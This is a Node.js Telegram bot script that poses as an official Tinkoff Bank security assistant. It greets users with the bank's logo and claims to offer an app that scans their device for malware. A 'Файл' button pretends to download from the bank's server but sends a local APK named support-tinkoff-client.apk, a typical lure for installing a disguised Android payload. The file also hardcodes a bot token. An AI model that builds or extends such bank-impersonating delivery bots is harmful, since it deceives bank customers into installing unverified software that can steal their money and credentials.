const TelegramBot = require("node-telegram-bot-api");

const token = "6933852086:AAHxCNPJN0mMY9lEc4OrlfATkqR2Z3hOpqo";
const bot = new TelegramBot(token, { polling: true });
const webApiUrl = 'https://www.tinkoff.ru/'

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const gifFilePath = './tinkoff-logo.gif';

  bot.sendDocument(chatId, gifFilePath, {
    caption: `Привет! Я — Помощник Тинькофф.

Бот предназначен для помощи клиентов по решению проблем с безопасностью.

В нем можно скачать приложение, которое сканирует на наличие вредоносных программ
и различных мошеннических действий на вашем устройстве`,
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: 'Сайт',
            web_app: {url: webApiUrl}
          },
          {
            text: 'Файл',
            callback_data: 'file'
          }
        ]
      ]
    }
  });
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data === 'file') {
    bot.sendMessage(chatId, 'Загрузка файла с сервера банка...🌐');
    sendFile(chatId);
  }
});

function sendFile(chatId) {
  const filePath = 'support-tinkoff-client.apk';

  bot.sendDocument(chatId, filePath)
    .then(() => {
      console.log(`Файл успешно отправлен пользователю с chatId ${chatId}`);
    })
    .catch((error) => {
      console.error('Ошибка отправки файла:', error);
    });
}
